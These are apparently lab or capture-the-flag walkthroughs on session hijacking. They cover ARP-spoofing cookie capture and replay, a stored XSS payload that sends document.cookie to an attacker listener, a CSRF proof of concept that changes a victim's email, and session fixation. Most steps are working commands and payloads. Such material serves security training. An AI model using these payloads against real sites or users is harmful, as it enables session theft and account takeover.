# 10 Session Hijacking — full walkthroughs

---

## Walkthrough 1: "Capture the session cookie of the victim 10.10.10.50 browsing http://app.lab.local and reuse it to access their dashboard"

**Type:** MITM cookie theft + replay | **Difficulty:** medium | **Time:** 5–8 min

1. Prep:
   ```bash
   sudo sysctl -w net.ipv4.ip_forward=1
   ```
2. ARP poison (two terminals):
   ```bash
   sudo arpspoof -i eth0 -t 10.10.10.50 10.10.10.1
   sudo arpspoof -i eth0 -t 10.10.10.1 10.10.10.50
   ```
3. Capture:
   ```bash
   sudo tcpdump -i eth0 -w cookies.pcap 'host 10.10.10.50 and tcp port 80'
   ```
4. Wait for the victim to browse / refresh the page.
5. Stop the capture (Ctrl-C). Open in Wireshark:
   ```
   http.cookie
   ```
6. Click a request → Copy the `Cookie:` header value (e.g. `SESSIONID=abc123def456`).
7. Replay in Burp Repeater (or curl):
   ```bash
   curl -v -b "SESSIONID=abc123def456" http://app.lab.local/dashboard
   ```
8. Response contains the victim's dashboard HTML → hijack confirmed.
9. **Answer:** the captured cookie value and/or content from `/dashboard`.

---

## Walkthrough 2: "Use a stored XSS on http://app.lab.local/comments to steal an admin cookie"

**Type:** XSS cookie exfil | **Difficulty:** medium | **Time:** 5 min

1. Start a catcher:
   ```bash
   python3 -m http.server 80
   ```
2. Post this comment:
   ```html
   <script>new Image().src='http://<LHOST>/?c='+document.cookie</script>
   ```
3. Wait for the admin to view the comments page. In your server log:
   ```
   10.10.10.50 - - [..] "GET /?c=SESSIONID=abc123def456 HTTP/1.1" 404 -
   ```
4. Paste the cookie into Burp Repeater or Firefox Storage and refresh the admin-only page.
5. **Answer:** the admin cookie value + proof of accessing admin-only content.

**Gotcha:** if `HttpOnly` is set, JS can't read the cookie. Pivot to CSRF (Walkthrough 3) or keylogging (`document.onkeypress`).

---

## Walkthrough 3: "Exploit CSRF to change the victim's email via a PoC page"

**Type:** CSRF | **Difficulty:** medium | **Time:** 5 min

1. In Burp Proxy, capture the legit request that changes the email:
   ```
   POST /account/email HTTP/1.1
   Host: app.lab.local
   Cookie: SESSIONID=...
   Content-Type: application/x-www-form-urlencoded

   email=me@victim.lab
   ```
2. Right-click the request → `Engagement tools → Generate CSRF PoC`. Burp produces an HTML form that auto-submits.
3. Change the email value to `attacker@evil.tld` and save as `/tmp/csrf.html`.
4. Host:
   ```bash
   cd /tmp && python3 -m http.server 80
   ```
5. Trick the logged-in victim into visiting `http://<LHOST>/csrf.html`. The browser sends their session cookie and the server updates the email.
6. **Answer:** proof the victim's email changed (fetch `/account` with the victim's cookie or ask the app).

**Key point:** CSRF works specifically because the victim's browser attaches cookies automatically on cross-site requests — no cookie theft required.

---

## Walkthrough 4: "Session fixation — force a known session ID on the victim"

**Type:** fixation | **Difficulty:** hard | **Time:** 5–10 min

1. Visit the app yourself, grab an un-authenticated session cookie:
   ```
   SESSIONID=FIXED123
   ```
   (Some apps let you choose one via `?SESSIONID=FIXED123`.)
2. Send the victim a link that pre-sets the cookie:
   ```
   http://app.lab.local/?SESSIONID=FIXED123
   ```
   or via XSS: `document.cookie="SESSIONID=FIXED123; path=/"`.
3. Victim clicks the link, then logs in normally. The app keeps the same cookie value (vulnerable to fixation because it doesn't rotate on login).
4. You now use `SESSIONID=FIXED123`:
   ```bash
   curl -v -b "SESSIONID=FIXED123" http://app.lab.local/dashboard
   ```
5. **Answer:** confirmation you accessed the victim's post-login area without ever stealing a cookie.

**Defense that would break this:** any app that rotates session ID on login (which is why the bug is rarer now).
